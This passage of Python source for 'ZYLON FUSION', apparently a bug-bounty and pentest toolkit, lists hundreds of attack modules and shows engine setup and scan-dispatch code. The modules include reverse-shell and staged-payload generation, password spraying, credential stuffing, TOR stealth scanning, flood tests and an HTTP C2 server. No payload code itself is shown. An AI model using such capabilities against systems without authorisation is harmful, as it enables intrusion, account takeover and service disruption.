            ("62", "Command Injection + OS Detection"),
            ("63", "Command Injection Shell (Interactive)"),
            # SSRF Exploitation (SSRFmap Fusion v3.0)
            ("64", "SSRF Vulnerability Detector (5-Level Bypass)"),
            ("65", "SSRF Cloud Metadata Extraction (AWS/GCE/Azure)"),
            ("66", "SSRF File Reader (file:// via SSRF)"),
            ("67", "SSRF Port Scanner (Internal Network)"),
            ("68", "SSRF Network Discovery (Ping Sweep)"),
            # Race Condition (Race-the-Web Fusion v3.0)
            ("69", "Race Condition Test (Single Endpoint - Barrier Fire)"),
            ("70", "Race Condition Test (Multi-Endpoint)"),
            ("71", "TOCTOU Race Condition (Check vs Use)"),
            # GraphQL Security (GraphQL-Cop Fusion v3.0)
            ("72", "GraphQL Full Security Audit (15 Tests)"),
            ("73", "GraphQL Endpoint Discovery"),
            ("74", "GraphQL Introspection + Schema Extraction"),
            ("75", "GraphQL DoS Vector Testing"),
            ("76", "GraphQL CSRF Testing"),
            # v4.0 FUSION - Ciphey + JWT + SSTI + NoSQL + Container
            ("77", "Auto-Decode (Ciphey - 19 Decoders)"),
            ("78", "Hash Identifier (300+ Hash Types)"),
            ("79", "JWT Full Attack Playbook (8 Vectors)"),
            ("80", "JWT Key Confusion (RS256->HS256)"),
            ("81", "JWT alg:none + Null Signature"),
            ("82", "JWT kid Injection + Claim Tampering"),
            ("83", "JWT HMAC Key Cracking"),
            ("84", "SSTI Detection (17+ Engines)"),
            ("85", "SSTI Full Exploit (RCE)"),
            ("86", "NoSQL Injection Detection"),
            ("87", "NoSQL Auth Bypass ($ne, $gt, $where)"),
            ("88", "NoSQL Blind Data Extraction"),
            ("89", "Container Security Scan (DEEPCE)"),
            ("90", "Container Escape Check"),
            # v4.1 FUSION - WAF Evasion + WebSocket + Smuggling + CRLF + OpenRedirect + 403Bypass
            ("91", "WAF Detection + Bypass Generator"),
            ("92", "WebSocket Security Scanner"),
            ("93", "HTTP Request Smuggling (CL.TE + TE.CL)"),
            ("94", "CRLF Injection Scanner"),
            ("95", "Open Redirect Scanner"),
            ("96", "403 Bypass (Methods + Headers + Path)"),
            # v4.2 FUSION - Recon Engines Batch 3
            ("97", "ParamSpider (Historical Parameter Mining)"),
            ("98", "LinkFinder + SecretFinder (JS Analysis)"),
            ("98a", "Arjun (Hidden Parameter Discovery)"),
            ("98b", "Ghauri (WAF Bypass SQLi)"),
            ("98c", "CMSeeK (CMS Detection)"),
            ("98d", "Sherlock (Username Hunter)"),
            ("98e", "TEHQEEQ (Pakistani Recon)"),
            ("42", "Bug Bounty Full Recon Pipeline"),
            ("43", "Bug Bounty Full Vuln Pipeline"),
            ("99", "MEGA SCAN (Every Single Module)"),
            ("ai", "AI-Powered Vulnerability Analysis (Experimental)"),
            ("group", "Group-Based Scanning (51 Groups - Run All Scans in a Category)"),
            ("scope", "Set/Check Bug Bounty Scope"),
            ("poc", "Generate PoC for Last Finding"),
            ("config", "Configuration Manager (API Keys)"),
            ("report", "View/Export Previous Scan Reports"),
            ("update", "Check for Updates"),
            ("144", "SQLi Detection (SQLMap-style 6 techniques)"),
            ("145", "SQLi Exploitation (DB + Table Extraction)"),
            ("146", "SQLi DIOS (Dump In One Shot)"),
            ("147", "SQLi WAF Bypass (Detect + Evade)"),
            ("148", "XSS Reflected Advanced (XSStrike-style)"),
            ("149", "XSS DOM Advanced (Source/Sink Analysis)"),
            ("150", "XSS Blind Advanced (Callback Testing)"),
            ("151", "XSS Context-Aware Fuzzing"),
            ("152", "XSS Full Scan (All XSS Types)"),
            ("153", "SQLi Full Scan (All SQLi Types)"),
            # v5.0 FUSION Batch 2 - Advanced LFI + Path Traversal
            ("154", "LFI Advanced Detection (Depth + Multi-Encoding + Null Byte)"),
            ("155", "LFI PHP Wrapper Exploit (filter/input/data/expect)"),
            ("156", "LFI Log Poisoning RCE (Apache/Nginx/SSH)"),
            ("157", "LFI /proc/self Exploit (environ/cmdline/fd)"),
            ("158", "LFI WAF Bypass (12 Techniques + Header Evasion)"),
            ("159", "LFI Auto Exploit Chain (Detect->Fingerprint->Exploit->RCE)"),
            ("160", "Path Traversal Detection (16+ Sequences)"),
            ("161", "Path Traversal Config Scan (80+ Paths + Java Servers)"),
            ("162", "Path Traversal Encoding Bypass (16 Methods)"),
            ("163", "LFI/Path Traversal Full Scan (All Techniques)"),
            # v5.0 FUSION Batch 3 - Advanced Subdomain + OSINT (Task 2c)
            ("164", "Subdomain Passive Advanced (13+ Sources)"),
            ("165", "Subdomain Brute Force Advanced (200+ Words)"),
            ("166", "Subdomain Cert Transparency Deep Search"),
            ("167", "Subdomain Takeover Check (25+ Services)"),
            ("168", "Subdomain Cloud Assets (S3/Azure/GCP/Firebase)"),
            ("169", "Subdomain Full Recon Advanced (6 Phases)"),
            ("170", "OSINT Email Harvest Advanced (7 Sources)"),
            ("171", "OSINT Google Dorks Advanced (7 Categories)"),
            ("172", "OSINT DNS Recon Advanced (Full Records)"),
            ("173", "OSINT Full Scan Advanced (7 Phases)"),
            # v5.0 FUSION Batch 4 - TPLmap + Nuclei-Style (Task 3b)
            ("184", "SSTI Advanced Detection (TPLmap)"),
            ("185", "SSTI Engine Identification (TPLmap)"),
            ("186", "SSTI Sandbox Escape (TPLmap)"),
            ("187", "SSTI Code Execution (TPLmap)"),
            ("188", "SSTI Blind Detection (TPLmap)"),
            ("189", "Nuclei-Style Template Scan"),
            ("190", "Nuclei-Style CVE Scan"),
            ("191", "Nuclei-Style Exposed Panels"),
            ("192", "Nuclei-Style Default Creds"),
            ("193", "Nuclei-Style Full Scan"),
            # v5.0 FUSION Batch 4 - Wapiti + Dirsearch Engines (Task 3a)
            ("174", "Wapiti XSS Module (Black-Box Fuzzer)"),
            ("175", "Wapiti SQLi Module (Black-Box Fuzzer)"),
            ("176", "Wapiti SSRF Module (Black-Box Fuzzer)"),
            ("177", "Wapiti Full Scan (All 7 Modules)"),
            ("178", "Directory Brute Force Quick (Dirsearch-style)"),
            ("179", "Directory Brute Force Recursive (Dirsearch-style)"),
            ("180", "Directory Extension Scan (Dirsearch-style)"),
            ("181", "Directory Deep Scan (Dirsearch-style)"),
            ("182", "Wapiti CRLF Module (Black-Box Fuzzer)"),
            ("183", "Wapiti Cmd Injection Module (Black-Box Fuzzer)"),
            # v5.0 FUSION Batch 5 - Session Security + Deserialization Engines (Task 3c)
            ("194", "Flask Session Decode/Brute (Flask-Unsign)"),
            ("195", "Session Cookie Security (Secure/HttpOnly/SameSite)"),
            ("196", "Session Fixation Test (4 Tests)"),
            ("197", "Session Security Full Scan (All Session Checks)"),
            ("198", "Java Deserialization Detection (Ysoserial)"),
            ("199", "PHP Deserialization Detection (PHPGGC)"),
            ("200", "Python Pickle Deserialization Detection"),
            ("201", "Deserialization Payload Generation (Java/PHP)"),
            ("202", "Blind Deserialization Detection (5 Techniques)"),
            ("203", "Deserialization Full Scan (All Deser Checks)"),
            # v5.0 FUSION Batch 6 - Cloud + Container Advanced Engines (Task 4a)
            ("204", "Cloud S3 Bucket Enum (Advanced)"),
            ("205", "Cloud Azure Blob Enum (Advanced)"),
            ("206", "Cloud GCP Storage Enum (Advanced)"),
            ("207", "Cloud Metadata Extraction (Advanced)"),
            ("208", "Cloud Credential Scan (Advanced)"),
            ("209", "Cloud Misconfiguration Scan (Advanced)"),
            ("210", "Cloud Full Scan (Advanced - 7 Phases)"),
            ("211", "Container Docker API Detection (Advanced)"),
            ("212", "Container Escape Check (Advanced - 12 Vectors)"),
            ("213", "Container Full Scan (Advanced - 7 Phases)"),
            # v5.0 FUSION Batch 6 - Credential + Takeover Advanced + CORS Advanced (Task 4b)
            ("214", "Password Spraying (CredMaster Fusion)"),
            ("215", "Credential Stuffing (Leaked DB)"),
            ("216", "Username Enumeration (Auth Response Analysis)"),
            ("217", "Auth Testing Full (Basic + Form + API)"),
            ("218", "Subdomain Takeover Check Advanced (30+ Services)"),
            ("219", "Subdomain Takeover Mass Scan"),
            ("220", "Subdomain Takeover CNAME Verify"),
            ("221", "Subdomain Takeover Full Scan"),
            ("222", "CORS Origin Test (CorsonE Fusion)"),
            ("223", "CORS Null Origin Test"),
            ("224", "CORS Subdomain Bypass"),
            ("225", "CORS Misconfiguration Detect"),
            ("226", "CORS Full Scan (CORScanner Fusion)"),
            ("227", "Password Spraying Stealth (Enhanced Evasion)"),
            ("228", "API Auth Testing"),
            ("229", "HTTP Form Auth Testing"),
            ("230", "Subdomain Takeover Service Verify"),
            ("231", "CORS Credential Inclusion"),
            ("232", "CORS + CSRF Chain Detection"),
            ("233", "Credential Full Scan (All Cred Checks)"),
            # v5.0 FUSION Batch 7 - OAST/Callback + ReDoS/CSP + Git Advanced (Task 5a)
            ("234", "OAST Blind SSRF Test"),
            ("235", "OAST Blind XXE Test"),
            ("236", "OAST Blind Cmd Injection Test"),
            ("237", "OAST Blind XSS Test"),
            ("238", "OAST Full Callback Scan"),
            ("239", "ReDoS Detection"),
            ("240", "CSP Analysis"),
            ("241", "CSP Bypass Finder"),
            ("242", "CSP + ReDoS Full Scan"),
            ("243", "Git Exposure Detection"),
            ("244", "Git Repo Dump"),
            ("245", "GitHub Dork Search"),
            ("246", "SVN/HG/BZR Exposure Detection"),
            ("247", "Git Full Security Scan"),
            ("248", "OAST Callback Server"),
            ("249", "ReDoS Exploit String Gen"),
            ("250", "CSP XSS Bypass Test"),
            ("251", "Git Secret Scan"),
            ("252", "GitHub Code Search"),
            ("253", "ReDoS + CSP + Git Combined Scan"),
            # v5.0 FUSION Batch 7 - Web Fuzzer + ShellGen Advanced + Hash Advanced (Task 5b)
            ("254", "Content Discovery Fuzz (FFUF-style)"),
            ("255", "API Endpoint Fuzz (Kiterunner-style)"),
            ("256", "Parameter Fuzz (GET/POST)"),
            ("257", "Header Fuzz (Bypass/Info Leak)"),
            ("258", "VHost Discovery (Virtual Hosts)"),
            ("259", "Recursive Fuzz (Deep Discovery)"),
            ("260", "Web Fuzzer Full Scan (All Fuzz Types)"),
            ("261", "Reverse Shell Generate (15+ Languages)"),
            ("262", "Bind Shell Generate (8 Languages)"),
            ("263", "Shell Obfuscation (Base64/Hex/XOR)"),
            ("264", "Shell Payload Full Gen (All Types + Obfuscation)"),
            ("265", "Hash Identify (300+ Hash Types)"),
            ("266", "Hash Crack (Dictionary Attack)"),
            ("267", "Hash Batch Crack (Multi-Hash)"),
            ("268", "Hash Online Crack (Multiple APIs)"),
            ("269", "Hash Full Scan (Identify + Crack + Online)"),
            ("270", "API JSON Fuzz (Prototype Pollution/NoSQL)"),
            ("271", "Staged Payload Generate (Meterpreter-like)"),
            ("272", "Password Candidate Gen (Rule-based)"),
            ("273", "Fuzzer + Shell + Hash Combined"),
            # v5.0 FUSION Batch 8 - DDoS Testing + CMS Advanced + Crypto Advanced Engines (Task 6a)
            ("274", "HTTP Flood Test (MHDDoS-style Defense Test)"),
            ("275", "Slowloris Test (Connection Exhaustion)"),
            ("276", "TCP Flood Test (SYN Flood Simulation)"),
            ("277", "Rate Limit Detection (Advanced)"),
            ("278", "DDoS Resilience Test (4-Phase)"),
            ("279", "DDoS Full Defense Test + Report"),
            ("280", "CMS Detection (180+ CMS Fingerprinting)"),
            ("281", "WordPress Deep Scan (WPScan-style)"),
            ("282", "Joomla Deep Scan (Droopescan-style)"),
            ("283", "Drupal Deep Scan (SA-CORE Checks)"),
            ("284", "Magento Scan"),
            ("285", "CMS Default Creds (Multi-CMS)"),
            ("286", "CMS Full Scan (Detect + Deep + Creds)"),
            ("287", "Auto Decode Advanced (Ciphey+)"),
            ("288", "Encoding Chain Decode (Multi-Layer)"),
            ("289", "XOR Crack (Single + Multi-byte)"),
            ("290", "Caesar Crack (All 25 Shifts)"),
            ("291", "Crypto Frequency Analysis"),
            ("292", "Crypto Full Analysis (6 Phases)"),
            ("293", "DDoS + CMS + Crypto Combined"),
            # v5.0 FUSION Batch 9 - AI Pentest + Stealth + Wordlist Engines (Task 6b)
            ("294", "AI Target Analysis"),
            ("295", "AI Attack Strategy"),
            ("296", "AI Payload Generation"),
            ("297", "AI Vulnerability Prioritization"),
            ("298", "AI Report Generation"),
            ("299", "AI Full Analysis"),
            ("300", "Stealth Scan Mode"),
            ("301", "TOR-Routed Scan"),
            ("302", "Proxy Chain Scan"),
            ("303", "Slow Scan Mode"),
            ("304", "Stealth Full Scan"),
            ("305", "Wordlist Target Generation"),
            ("306", "Wordlist Password Generation"),
            ("307", "Wordlist Subdomain Generation"),
            ("308", "Wordlist Username Generation"),
            ("309", "Wordlist Full Generation"),
            ("310", "AI + Stealth Combined"),
            ("311", "Stealth Identity Rotation"),
            ("312", "AI Interpret Results"),
            ("313", "AI + Stealth + Wordlist Combined"),
            # v5.0 FUSION Batch 10 - Dalfox XSS + Mass Vuln + BizLogic Engines (Task 7a)
            ("314", "Dalfox XSS Quick Scan"),
            ("315", "Dalfox XSS Mass Scan"),
            ("316", "Dalfox XSS Blind Test"),
            ("317", "Dalfox XSS DOM Test"),
            ("318", "Dalfox XSS Full Scan"),
            ("319", "Mass Dork Scan"),
            ("320", "Mass SQLi Detection"),
            ("321", "Mass XSS Detection"),
            ("322", "Multi-Vuln Concurrent Scan"),
            ("323", "Mass Scan from File"),
            ("324", "Business Logic Price Manipulation"),
            ("325", "Business Logic Payment Bypass"),
            ("326", "Business Logic Privilege Escalation"),
            ("327", "Business Logic Race Condition"),
            ("328", "Business Logic Full Scan"),
            ("329", "Dalfox Parameter Analysis"),
            ("330", "Mass Vuln Classification"),
            ("331", "Business Logic Cart Manipulation"),
            ("332", "Business Logic Discount Abuse"),
            ("333", "Mass + BizLogic Combined Scan"),
            # v5.0 FUSION Batch 11 - WebSocket + H2C Smuggling + Prototype Pollution (Task 7b)
            ("334", "WebSocket Endpoint Discovery"),
            ("335", "WebSocket Auth Testing"),
            ("336", "WebSocket Message Fuzzing"),
            ("337", "WebSocket Cross-Origin Test"),
            ("338", "WebSocket Full Scan"),
            ("339", "H2C Smuggling Detection"),
            ("340", "CL.TE Smuggling Detection"),
            ("341", "TE.CL Smuggling Detection"),
            ("342", "HTTP Smuggling Full Scan"),
            ("343", "Server-Side Prototype Pollution"),
            ("344", "Client-Side Prototype Pollution"),
            ("345", "DOM Clobbering Detection"),
            ("346", "Prototype Pollution Full Scan"),
            ("347", "WebSocket DoS Test"),
            ("348", "H2.CL Detection"),
            ("349", "HTTP Smuggling Timing Analysis"),
            ("350", "PP Gadget Chain Finder"),
            ("351", "WebSocket Message Replay"),
            ("352", "PP via JSON Body"),
            ("353", "WS + H2C + PP Combined Scan"),
            # v5.0 FUSION Batch 12 - Payload DB + Exploit Dev + Metadata Engines (Task 8a)
            ("354", "Payload DB Browse"),
            ("355", "Payload Search"),
            ("356", "GF-Style URL Categorize"),
            ("357", "WAF Bypass Payloads"),
            ("358", "Payload Full DB"),
            ("359", "Pattern Generation (PwnTools)"),
            ("360", "ROP Chain Helper"),
            ("361", "Shellcode Generation"),
            ("362", "Format String Test"),
            ("363", "Integer Overflow Test"),
            ("364", "Exploit Dev Tools"),
            ("365", "Image EXIF Extraction"),
            ("366", "Document Metadata Extract"),
            ("367", "Metadata Strip/Anonymize"),
            ("368", "OPSEC Check"),
            ("369", "Privacy Risk Assessment"),
            ("370", "Metadata Full Scan"),
            ("371", "Payload Import Custom"),
            ("372", "Payload Encode (Bad Chars)"),
            ("373", "PayloadDB + Exploit + Metadata Combined"),
            # v5.0 FUSION Batch 12 - Bounty Management + Cache Poison Advanced + Mobile Security (Task 8b)
            ("374", "Bug Bounty Program Management"),
            ("375", "Finding Classification"),
            ("376", "Report Generation"),
            ("377", "Scope Validation"),
            ("378", "Bounty Management Full Scan"),
            ("379", "Cache Detection"),
            ("380", "Cache Unkeyed Input Detection"),
            ("381", "Cache Header Poisoning"),
            ("382", "Cache Deception Test"),
            ("383", "Cache Poisoning Full Scan"),
            ("384", "Mobile API Security Test"),
            ("385", "SSL Pinning Detection"),
            ("386", "Deep Link Testing"),
            ("387", "WebView Vulnerability Detection"),
            ("388", "Mobile Security Full Scan"),
            ("389", "Cache Param Cloaking"),
            ("390", "Cache Fat GET Poisoning"),
            ("391", "Certificate Pinning Test"),
            ("392", "APK Metadata Analysis"),
            ("393", "Bounty + Cache + Mobile Combined"),
            # V3 Security Engine (Orphaned → Now Wired!)
            ("400", "GraphQL Security Tester (V3 Engine)"),
            ("401", "DOM XSS Scanner (V3 Engine)"),
            ("402", "Web Cache Deception (V3 Engine)"),
            ("403", "Clickjacking Tester (V3 Engine)"),
            ("404", "Account Takeover Scanner (V3 Engine)"),
            ("405", "OAuth Misconfiguration (V3 Engine)"),
            ("406", "HTTP Method Tampering (V3 Engine)"),
            ("407", "Blind XSS Scanner (V3 Engine)"),
            ("408", "2FA Bypass Tester (V3 Engine)"),
            ("409", "Mixed Content Scanner (V3 Engine)"),
            ("410", "Information Disclosure (V3 Engine)"),
            ("411", "V3 Security Full Scan (All 12 Modules)"),
            # V4 Hunting Engine
            ("412", "Username Enumeration (V4 Hunting)"),
            ("413", "Email Security DMARC/DKIM/SPF (V4 Hunting)"),
            ("414", "CSRF Detection (V4 Hunting)"),
            ("415", "Framework Detection (V4 Hunting)"),
            ("416", "JS Library Vulnerabilities (V4 Hunting)"),
            ("417", "403 Bypass Advanced (V4 Hunting)"),
            ("418", "Cross-Domain Policy (V4 Hunting)"),
            ("419", "CVE-to-Exploit Lookup (V4 Hunting)"),
            # V5 Async Engine
            ("420", "Async Subdomain Brute Force (V5 Engine)"),
            ("421", "Async Directory Brute Force (V5 Engine)"),
            ("422", "AI Smart Scan (V5 Engine)"),
            # HTTP C2
            ("423", "HTTP C2 Server (Phone Farm Control)"),
            # External Tool Wrappers
            ("424", "Nuclei Scanner (External)"),
            ("425", "SQLMap (External)"),
            ("426", "Sublist3r (External)"),
            ("427", "FFUF Fuzzer (External)"),
            ("tools", "Check External Tool Status"),
            ("perf", "Show Performance Stats (DNS Cache, Threads, Timeouts)"),
            ("search", "Search scans by keyword (e.g., search xss)"),
            ("checkpoints", "List resumable scan checkpoints"),
            ("resume", "Resume interrupted group scan (resume <target> <group>)"),
            ("fix", "Install Missing Dependencies"),
            ("exit/quit/q", "Exit ZYLON FUSION"),
        ]
        for cmd, desc in commands:
            help_table.add_row(cmd, desc)
        
        console.print(help_table)
    
    @staticmethod
    def display_scan_progress(module_name, target):
        """Display scanning progress indicator"""
        return console.status(
            f"[bold cyan][*] Running {module_name} on {target}...[/bold cyan]",
            spinner="dots"
        )
    
    @staticmethod
    def display_result_table(title, columns, rows):
        """Display results in a formatted table"""
        table = Table(
            title=f"[bold yellow]{title}[/bold yellow]",
            box=box.ROUNDED, border_style="bright_magenta"
        )
        for col in columns:
            table.add_column(col, style="cyan")
        for row in rows:
            table.add_row(*[str(item) for item in row])
        console.print(table)


# ============================================================================
# ZYLON FUSION MAIN ENGINE
# ============================================================================

class ZylonFusion:
    """ZYLON FUSION - Main Engine combining omino + wizard + custom techniques"""
    
    def __init__(self):
        self.version = ZYLON_VERSION
        self.target = None
        self.parsed_target = None
        self.protocol = "https://"

        # Performance: Use OptimizedSession with connection pooling (5-10x faster)
        if OptimizedSession:
            self.session = OptimizedSession(max_pool=100, max_per_host=20).session
        else:
            self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': random.choice(USER_AGENTS),
            'Connection': 'keep-alive',
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate',
        })
        self.session.verify = False
        self.results = {}
        self.scan_history = []

        # Performance utilities (5-10x speed boost)
        self.dns_cache = DNSCache(ttl=300, max_size=2000) if DNSCache else None
        self.adaptive_threads = AdaptiveThreading(base_threads=50) if AdaptiveThreading else None
        self.rate_limiter = RateLimiter(requests_per_second=20) if RateLimiter else None
        self.smart_timeout = SmartTimeout(default=10) if SmartTimeout else None

        # Initialize sub-engines
        self.recon = ReconEngine(self.session) if ReconEngine else None
        self.vuln = VulnEngine(self.session) if VulnEngine else None
        self.network = NetworkEngine(self.session) if NetworkEngine else None
        self.web = WebEngine(self.session) if WebEngine else None
        self.reports = ReportEngine() if ReportEngine else None
        self.ai = AIBridge() if AIBridge else None
        self.ui = ZylonUI()

        # Bug Bounty Arsenal engines
        self.adv_recon = AdvancedRecon(self.session) if AdvancedRecon else None
        self.injections = InjectionArsenal(self.session) if InjectionArsenal else None
        self.adv_web = AdvancedWebAttacks(self.session) if AdvancedWebAttacks else None
        self.bounty = BugBountyWorkflow() if BugBountyWorkflow else None

        # V2.0 Engines
        self.v2_recon = V2ReconEngine(self.session) if V2ReconEngine else None
        self.v2_vuln = V2VulnEngine(self.session) if V2VulnEngine else None
        
        # Origin IP Finder Engine
        self.origin_ip = OriginIPEngine(self.session) if OriginIPEngine else None

        # Hakuin-Optimized Blind SQLi Engine (v3.0 Fusion)
        self.hakuin = HakuinEngine(self.session) if HakuinEngine else None
        self.blind_sqli_detector = BlindSQLiDetector(self.session) if BlindSQLiDetector else None

        # Command Injection Engine (Commix Fusion v3.0)
        self.cmd_inject = CommandInjectionEngine(self.session) if CommandInjectionEngine else None

        # SSRF Exploitation Engine (SSRFmap Fusion v3.0)
        self.ssrf_engine = SSRFEngine(console) if SSRFEngine else None

        # Race Condition Detection Engine (Race-the-Web Fusion v3.0)
        self.race_engine = RaceEngine(console) if RaceEngine else None

        # GraphQL Security Engine (GraphQL-Cop Fusion v3.0)
        self.graphql_engine = GraphQLEngine(console) if GraphQLEngine else None

        # Ciphey Auto-Decode Engine (Ciphey Fusion v4.0)
        self.ciphey_engine = CipheyEngine() if CipheyEngine else None

        # JWT Security Engine (jwt_tool Fusion v4.0)
        self.jwt_engine = JWTEngine() if JWTEngine else None

        # SSTI Engine (SSTImap Fusion v4.0)
        self.ssti_engine = None  # Initialized per scan with target

        # NoSQL Injection Engine (NoSQLMap Fusion v4.0)
        self.nosql_engine = None  # Initialized per scan with target

        # Container Security Engine (DEEPCE Fusion v4.0)
        self.container_engine = ContainerEngine() if ContainerEngine else None

        # Orphaned Engines — v3 Security (20 modules), v4 Hunting (8 modules), v5 Async (4 modules)
        self.v3_security = V3SecurityEngine(self.session) if V3SecurityEngine else None
        self.v4_hunting = V4HuntingEngine(self.session) if V4HuntingEngine else None
        self.v5_async = V5AsyncEngine(self.session) if V5AsyncEngine else None
        self.http_c2 = HTTPC2Server(port=9999) if HTTPC2Server else None

        # Performance: Shared optimized session for engines that don't use self.session
        self._perf_session = OptimizedSession(max_pool=100, max_per_host=20) if OptimizedSession else None

        # Scan Deduplication Cache: avoids re-running identical (target, scan_type) within TTL
        self._scan_cache = {}       # key: (target, scan_type) -> (timestamp, results)
        self._scan_cache_ttl = 300  # 5 minutes — skip re-scan if last result is this fresh

        # HTTP Response Cache: avoids re-fetching same URL within TTL
        self._http_cache = {}       # key: url -> (timestamp, response_dict)
        self._http_cache_ttl = 120  # 2 minutes

        # Resumable Scan Checkpoint System
        self._checkpoint_dir = os.path.join(get_home(), '.zylon', 'checkpoints')
        self._current_checkpoint = None

    def perf_get(self, url, **kwargs):
        """Performance-optimized GET: DNS cache + rate limiter + smart timeout + connection pooling + response cache"""
        # Check HTTP response cache first
        if url in self._http_cache:
            cached_time, cached_resp = self._http_cache[url]
            if time.time() - cached_time < self._http_cache_ttl:
                return cached_resp
        if self.rate_limiter:
            self.rate_limiter.wait()
        if self.smart_timeout:
            kwargs.setdefault('timeout', self.smart_timeout.get_timeout())
        else:
            kwargs.setdefault('timeout', DEFAULT_TIMEOUT)
        kwargs.setdefault('verify', VERIFY_SSL)
        kwargs.setdefault('allow_redirects', False)
        try:
            start = time.time()
            resp = self.session.get(url, **kwargs)
            elapsed = time.time() - start
            if self.smart_timeout:
                self.smart_timeout.record_response(elapsed)
            if self.adaptive_threads:
                self.adaptive_threads.record_success(elapsed)
            if self.rate_limiter:
                self.rate_limiter.reset_backoff()
            # Cache the response
            self._http_cache[url] = (time.time(), resp)
            return resp
        except Exception as e:
            if self.adaptive_threads:
                self.adaptive_threads.record_error()
            if self.rate_limiter and '429' in str(e):
                self.rate_limiter.trigger_backoff()
            raise

    def perf_post(self, url, **kwargs):
        """Performance-optimized POST: DNS cache + rate limiter + smart timeout + connection pooling"""
        if self.rate_limiter:
            self.rate_limiter.wait()
        if self.smart_timeout:
            kwargs.setdefault('timeout', self.smart_timeout.get_timeout())
        else:
            kwargs.setdefault('timeout', DEFAULT_TIMEOUT)
        kwargs.setdefault('verify', VERIFY_SSL)
        try:
            start = time.time()
            resp = self.session.post(url, **kwargs)
            elapsed = time.time() - start
            if self.smart_timeout:
                self.smart_timeout.record_response(elapsed)
            if self.adaptive_threads:
                self.adaptive_threads.record_success(elapsed)
            if self.rate_limiter:
                self.rate_limiter.reset_backoff()
            return resp
        except Exception as e:
            if self.adaptive_threads:
                self.adaptive_threads.record_error()
            if self.rate_limiter and '429' in str(e):
                self.rate_limiter.trigger_backoff()
            raise

    def resolve_dns(self, domain):
        """DNS resolution with caching (saves 2-5s per repeated lookup)"""
        if self.dns_cache:
            return self.dns_cache.resolve(domain)
        try:
            return socket.gethostbyname(domain)
        except Exception:
            return None

    def get_optimal_threads(self):
        """Get adaptive thread count based on system and error rate"""
        if self.adaptive_threads:
            return self.adaptive_threads.get_thread_count()
        return MAX_THREADS
    
    def set_target(self, target):
        """Validate and set target"""
        target = target.strip()
        # Remove protocol if user included it
        if '://' in target:
            target = target.split('://', 1)[1]
        target = target.rstrip('/')
        
        # Better validation - check for valid domain or IP
        if '.' not in target:
            return False, "Invalid target - must contain a domain or IP"
        
        # Basic format check
        import re
        domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'
        ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}(:\d+)?$'
        
        is_valid = re.match(domain_pattern, target) or re.match(ip_pattern, target)
        if not is_valid:
            return False, f"Invalid target format: {target}"
        
        self.target = target
        self.parsed_target = urlparse(f"https://{target}")
        return True, f"Target set: {target}"
    
    def run_scan(self, scan_type):
        """Run a specific scan type"""
        if not self.target:
            console.print("[bold red][!] No target set![/bold red]")
            return
        
        self.results = {'target': self.target, 'scan_type': scan_type,
                       'timestamp': datetime.now().isoformat(), 'findings': {}}

        # Use the single-source scan_map (eliminates duplicate definition)
        scan_map = self._build_scan_map()

        scan_func = scan_map.get(scan_type)
        if scan_func:
            try:
                # Scan Dedup: skip if same (target, scan_type) ran recently
                cache_key = (self.target, scan_type)
                if cache_key in self._scan_cache:
                    cached_time, cached_results = self._scan_cache[cache_key]
                    age = time.time() - cached_time
                    if age < self._scan_cache_ttl:
                        console.print(f"[dim][*] Using cached results from {age:.0f}s ago (TTL: {self._scan_cache_ttl}s)[/dim]")
                        self.results = cached_results
                        return

                scan_func()
                # Cache this scan's results
                self._scan_cache[cache_key] = (time.time(), dict(self.results))
                # Track scan history
                self.scan_history.append({
                    'scan_type': scan_type,
                    'target': self.target,
                    'timestamp': datetime.now().isoformat(),
                    'findings_count': len(self.results.get('findings', {}))
                })
                # Auto-save results (with error handling)
                try:
                    self.reports.save_json(self.results, self.target)
                except Exception as save_err:
                    # Fallback: save to a simple JSON file
                    try:
                        report_dir = os.path.join(get_home(), '.zylon', 'reports')
                        os.makedirs(report_dir, exist_ok=True)
                        report_file = os.path.join(report_dir, f"{self.target}_{scan_type}_{int(time.time())}.json")
                        with open(report_file, 'w') as f:
                            json.dump(self.results, f, indent=2, default=str)
                    except Exception:
                        pass
                console.print(f"\n[bold green][+] Scan complete! Results saved.[/bold green]")
            except Exception as e:
                console.print(f"[bold red][!] Scan error: {str(e)}[/bold red]")
                import traceback
                if os.environ.get('ZYLON_DEBUG'):
                    console.print(f"[dim red]{traceback.format_exc()}[/dim red]")
        else:
            console.print(f"[bold red][!] Unknown scan type: {scan_type}[/bold red]")

    # ========================================================================
    # GROUP-BASED SCANNING SYSTEM (v6.0 ULTIMATE)
    # ========================================================================

    # All 51 vulnerability/tool groups with their scan IDs
    SCAN_GROUPS = {
        'G1': {
            'name': 'SQL Injection',
            'icon': '🔥',
            'color': 'bold red',
            'scans': ['9', '56', '57', '58', '59', '60', '144', '145', '146', '147', '153', '98b', '175', '320'],
            'desc': 'All SQL Injection attacks — Basic, Blind, SQLMap, Ghauri, Wapiti, Mass'
        },
        'G2': {
            'name': 'XSS Attack',
            'icon': '⚡',
            'color': 'bold yellow',
            'scans': ['10', '148', '149', '150', '151', '152', '174', '314', '315', '316', '317', '318', '321', '237'],
            'desc': 'All XSS attacks — Basic, Reflected, DOM, Blind, Context-Aware, Dalfox, Wapiti'
        },
        'G3': {
            'name': 'LFI / Path Traversal',
            'icon': '📂',
            'color': 'bold green',
            'scans': ['32', '154', '155', '156', '157', '158', '159', '160', '161', '162', '163'],
            'desc': 'All LFI + Path Traversal — Advanced, PHP Wrappers, Log Poisoning, WAF Bypass'
        },
        'G4': {
            'name': 'SSRF Attack',
            'icon': '🌐',
            'color': 'bold blue',
            'scans': ['30', '64', '65', '66', '67', '68', '176', '234'],
            'desc': 'All SSRF attacks — Detection, Cloud Metadata, File Read, Port Scan, Network'
        },
        'G5': {
            'name': 'SSTI / Template Injection',
            'icon': '🧪',
            'color': 'bold magenta',
            'scans': ['31', '84', '85', '184', '185', '186', '187', '188'],
            'desc': 'All SSTI attacks — Detection, Exploit, TPLmap Engine, Sandbox Escape'
        },
        'G6': {
            'name': 'Subdomain Discovery',
            'icon': '🔍',
            'color': 'bold cyan',
            'scans': ['4', '164', '165', '166', '168', '169', '54'],
            'desc': 'All Subdomain Discovery — Passive, Brute Force, Cert Transparency, Cloud'
        },
        'G7': {
            'name': 'Subdomain Takeover',
            'icon': '🏴',
            'color': 'bold red',
